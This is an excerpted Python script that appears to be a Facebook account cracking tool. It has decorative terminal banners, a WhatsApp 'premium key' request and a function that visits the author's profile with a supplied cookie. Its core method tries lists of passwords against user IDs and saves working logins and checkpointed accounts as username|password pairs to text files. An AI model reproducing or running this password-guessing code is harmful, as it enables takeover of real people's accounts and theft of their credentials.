...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
           ...
           \033[1;33m 
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mCreated By    : ARSHAD ALI        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mcontact   : +923422510361       \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mBio : who will cry when you die      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : ++923422510361     \033[1;93m▇▇
...
def reg2():
    ...
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20ARSHAD-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
    os.system('am start https://wa.me/+923422510361?text=' + tks)
...
def chigozie():
    ...
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+923422510361');chigozie()
    try:
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : ARSHAD LAGHARI");time.sleep (0.03)
    print("             [*]. Bio  : Who will cry When You Die");time.sleep (0.03)
    print("             [*]. Cast    : LAGHARI");time.sleep (0.03)   
    print("             [*]. Whatsapp   : +923422510361");time.sleep (0.03)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [ARSHAD] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-ARSHAD] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('ARSHAD-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-ARSHAD] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('ARSHAD-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
    ...
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://www.facebook.com/profile.php?id=100088825806846",cookies={"cookie":coki}).text,"html.parser")
